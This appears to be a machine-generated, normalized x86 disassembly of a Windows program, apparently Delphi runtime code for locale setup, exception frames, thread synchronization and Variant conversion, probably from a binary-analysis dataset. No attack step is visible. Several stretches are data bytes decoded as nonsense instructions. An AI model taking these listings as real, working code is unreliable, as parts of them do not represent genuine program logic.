test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c0ac
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c04c
pop ecx
push ebp
call sub_40c04c
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402c28
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c238
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40c503
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c0c4
call sub_40aab4
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40aa04
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f00
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40aa04
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_407df4
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40aa04
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_407df4
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40aa50
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40aa50
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40aa04
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_407df4
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40aa50
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40aa04
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40ad3c
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403f00
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40aa04
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40ad3c
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403f00
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40aa50
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40aa04
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403f00
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40aa04
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403f00
lea eax [ ebp - 0x8 ]
call sub_403eac
lea eax [ ebp - 0xc ]
call sub_403eac
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40aa04
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_407df4
test eax eax
jne r-xdata
call sub_40ac8c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f44
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f44
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_40422c
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_40422c
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40aa50
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c50a
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403ed0
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40aa04
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_407df4
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40aa04
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_407df4
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_403f44
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_403f44
jmp r-xdata
sub_40c5b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40c648
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40a9b8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c64f
lea eax [ ebp - 0x14 ]
call sub_403eac
retn
sub_40c6a0
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_4081f0
mov [ rw-data ] eax
sub_40c724
push ebx
push esi
push edi
push ebp
call sub_403464
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026ec
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4030e0
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40344c
sub_40c78c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40c774
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40c814
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407910
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40c714
mov [ ebp ] eax
sub_40c814
push ebx
mov ebx eax
mov eax ebx
call sub_40c774
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40c714
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40c854
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c0
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_40c8c8
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
call sub_40c954
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_4030f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_40c954
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40c910
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40c78c
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40c71c
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40c6fc
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40c71c
test eax eax
je r-xdata
mov eax edi
call sub_40c910
test bl bl
je r-xdata
mov eax edi
call sub_40c944
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40c6fc
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40c708
sub_40c9f0
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c78c
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40c71c
mov eax ebx
call sub_40c928
mov eax ebx
call sub_40c91c
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c804
sub_40ca40
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40c78c
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40c934
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40c708
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40c6fc
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40c934
mov eax esi
call sub_40c928
sub_40caac
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c78c
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c804
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40c6fc
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40c928
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40c928
sub_40cb24
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40cb48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40cbbf
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4054e8
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4031a4
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cbc6
lea eax [ ebp - 0x4 ]
call sub_4054e8
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4031a4
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40cb24
test al al
jne r-xdata
mov al 0x1
sub_40cbe0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40cc52
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40cc34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40436c
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cc3b
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40cc64
sbb eax 0x4000000
arpl [ esi ] ax
xchg esp eax
jns r-xdata
js r-xdata
add ah bh
bound eax [ esi ]
and al 0x78
inc esi
add ah dh
bound eax [ esi ]
movsb [ edi ] [ esi ]
jne r-xdata
jpo r-xdata
add [ edx + 0x77c00046 ] dh
inc esi
add [ edx + 0x77cc0046 ] ch
inc esi
ja r-xdata
add ah ch
bound eax [ esi ]
or [ edx + 0x46 ] bh
add ah ah
bound eax [ esi ]
pop eax
jpe r-xdata
jpe r-xdata
add [ edx + 0x46 ] ch
add al ah
ja r-xdata
jne r-xdata
add [ edx + 0x46 ] dh
add [ ebx + edi * 2 + 0x46 ] cl
jpo r-xdata
add [ edx + 0x7af80046 ] ah
inc esi
add [ edx + 0x77c80046 ] bl
inc esi
ja r-xdata
add ah bl
bound eax [ esi ]
enter 0x4676 0x0
aam 0x62
inc esi
add [ eax + edi * 2 ] al
inc esi
add ah cl
bound eax [ esi ]
dec esp
jne r-xdata
add [ eax ] al
add [ eax ] cl
bound eax [ esi ]
jbe r-xdata
add [ edx ] ah
inc esi
add al bl
ja r-xdata
add [ edx + 0x46 ] ah
add [ eax ] al
bound eax [ esi ]
jo r-xdata
add [ edx ] ch
inc esi
add ah dh
bound eax [ esi ]
aam 0x7a
inc esi
add [ edx + 0x46 ] bl
add [ eax ] bl
jpo r-xdata
jbe r-xdata
add [ edx + 0x7ba80046 ] dl
inc esi
add [ edx + 0x794c0046 ] cl
inc esi
add [ edx + 0x791c0046 ] al
inc esi
jns r-xdata
add ah al
bound eax [ esi ]
jl r-xdata
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] al
inc esi
add ah bl
jbe r-xdata
add [ eax ] ch
add [ eax ] al
add [ edx ] bl
inc esi
add ah dl
jpe r-xdata
mov esp 0x4677
inc esi
add [ eax ] al
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] bl
bound eax [ esi ]
mov al 0x75
inc esi
add [ edx + 0x46 ] dl
add [ esi + esi * 2 + 0x624c0046 ] ch
inc esi
jne r-xdata
add [ eax ] bh
jbe r-xdata
add [ edx + 0x46 ] cl
jns r-xdata
add [ edx + 0x46 ] bh
add al al
jpo r-xdata
inc esi
inc esi
add [ edx + 0x78ec0046 ] bh
inc esi
jpe r-xdata
add [ eax ] al
add [ eax ] al
add ah ch
popad
inc esi
add [ edx + edi * 2 ] dh
inc esi
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
bound eax [ esi ]
aam 0x77
inc esi
jne r-xdata
add [ eax ] al
jne r-xdata
inc esi
ja r-xdata
add [ eax ] al
add [ eax ] al
add al bh
popad
inc esi
add [ eax + 0x76 ] ch
inc esi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] cl
inc esi
add [ eax + 0x76 ] dh
add [ eax ] al
add [ eax ] dl
bound eax [ esi ]
jne r-xdata
bound eax [ esi ]
call sub_4113ee
add [ edx + 0x46 ] al
add [ ecx + edi * 2 ] cl
inc esi
add [ edx ] bh
inc esi
add ah bh
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] dl
inc esi
add al ch
jns r-xdata
jne r-xdata
add [ edx ] dh
inc esi
add [ eax + 0x75 ] bl
inc esi
ja r-xdata
add [ eax ] al
add [ eax ] al
add ah dl
popad
inc esi
add [ eax + edi * 2 + 0x46 ] dh
add [ eax ] al
shl [ ecx + 0x46 ] 0x1
add [ eax ] al
add [ eax ] al
add [ ecx + 0x755c0046 ] bh
inc esi
add [ edi + esi * 2 + 0x46 ] dh
inc esi
add [ edi + esi * 2 ] ah
inc esi
js r-xdata
add [ eax ] al
add [ eax ] al
add al ch
popad
inc esi
add [ eax + 0x79 ] dh
inc esi
jne r-xdata
add [ eax ] al
add [ eax ] al
add al dh
popad
inc esi
add [ eax + 0x7a ] cl
inc esi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x75480046 ] dl
inc esi
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x7b240046 ] dh
inc esi
js r-xdata
add [ eax ] al
add al ah
popad
add [ eax ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add ah dh
popad
inc esi
add ah bh
js r-xdata
jns r-xdata
add [ eax ] al
add [ eax ] al
add ah bh
popad
inc esi
add [ eax + 0x79 ] cl
inc esi
jbe r-xdata
jne r-xdata
add [ edi + esi * 2 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add al dl
popad
inc esi
js r-xdata
add [ eax ] al
add [ eax ] al
add al bl
popad
inc esi
add [ edx + edi * 2 ] ch
inc esi
call sub_404928
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
call sub_403eac
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e3c
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e3c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
call sub_403eac
mov eax rw-data
call sub_403eac
mov eax rw-data
call sub_403eac
mov eax rw-data
call sub_403eac
mov eax rw-data
call sub_403eac
mov eax rw-data
call sub_403eac
mov eax rw-data
call sub_403eac
mov eax rw-data
call sub_403eac
mov eax rw-data
call sub_40458c
mov eax rw-data
call sub_403eac
add [ eax ] al
inc [ rw-data ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x78f40046 ] cl
inc esi
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x7bf00046 ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx + 0x78f80046 ] ch
inc esi
jpo r-xdata
add [ eax ] al
add [ eax ] al
add al cl
popad
inc esi
add [ ecx + edi * 2 ] ah
inc esi
jns r-xdata
add [ eax ] al
add [ eax ] al
add ah bl
popad
inc esi
add [ eax + 0x75 ] ah
inc esi
ja r-xdata
add [ eax ] al
add [ eax ] al
add ah ah
popad
inc esi
add [ edi + esi * 2 + 0x46 ] bh
add [ eax ] al
loopne r-xdata
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x75700046 ] ah
inc esi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004661 ] bh
js r-xdata
add [ eax ] al
add [ eax ] al
add al al
popad
inc esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d0b0
retn
mov eax rw-data
call sub_40cb14
call sub_40c680
call sub_40b900
mov eax rw-data
mov ecx 0x16
idiv edi
add [ eax ] al
add [ eax ] al
add [ ecx + 0x46 ] ah
add ah ch
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x4bffb99f ] dh
jpe r-xdata
add [ eax ] al
add [ eax ] al
add ah al
popad
inc esi
add [ eax + edi * 2 + 0x46 ] dl
add [ eax ] al
shl [ ecx + 0x46 ] 0x0
je r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add ah cl
popad
inc esi
add [ eax + 0x78 ] bh
inc esi
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffb99f ] ah
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x57ffb99f ] ch
mov edx [ sub_40b3d8 ]
add [ ecx + 0x16 ] bh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x61 ] ah
inc esi
add [ eax + 0x4676 ] bh
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x17ffb99f ] bl
add [ eax ] al
add [ eax ] al
add [ eax - 0x77ffb99f ] cl
push ebp
push sub_40d0a9
push [ fs : eax ]
mov [ fs : eax ] esp
add [ eax ] al
add [ eax ] al
add [ eax - 0x1bffb99f ] dl
sub_40d0b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d11c
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d123
retn
mov eax sub_40cc64
call sub_403bd4
mov eax r-xdata
call sub_403bfc
cmp [ rw-data ] 0x0
je r-xdata
call sub_40b87c
call sub_40b980
call sub_40c6a0
call sub_40c238
mov eax rw-data
mov edx r-xdata
call sub_403f00
sub_40d154
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d1a8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d202
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404134
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_407e0c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d209
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40d214
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d26e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404134
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409114
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d275
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40d280
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d2da
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404134
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4090e8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d2e1
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40d2ec
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d346
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404134
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40a92c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d34d
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40d358
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d3b2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404134
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409140
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d3b9
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40d3c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40d431
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404134
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_407ef8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d438
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
sub_40d444
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d4a4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40909c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4046d8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4ab
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40d4b4
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d514
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a0ec
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4046d8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d51b
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40d524
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d588
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_407f94
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4046d8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d58f
